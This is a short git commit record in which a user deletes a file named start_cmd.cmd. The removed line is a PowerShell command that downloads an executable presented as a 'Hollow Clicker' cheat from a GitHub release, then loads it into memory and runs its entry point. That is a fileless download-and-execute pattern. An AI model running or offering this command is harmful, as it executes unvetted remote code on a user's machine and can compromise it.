48d113a6fd976aecb72c7f36c741c490d8121b74
TechG <133663470+TechG2@users.noreply.github.com>
2025-01-12 17:30:24 +0100

    Delete start_cmd.cmd

--- start_cmd.cmd
+++
@@ -1,1 +0,0 @@
-powershell -Command "[System.Reflection.Assembly]::Load((Invoke-WebRequest "https://github.com/loader-cheat/Hollow-Clicker-Public/releases/download/Latest/Hollow.Clicker.exe").Content).EntryPoint.Invoke($null, $null)"
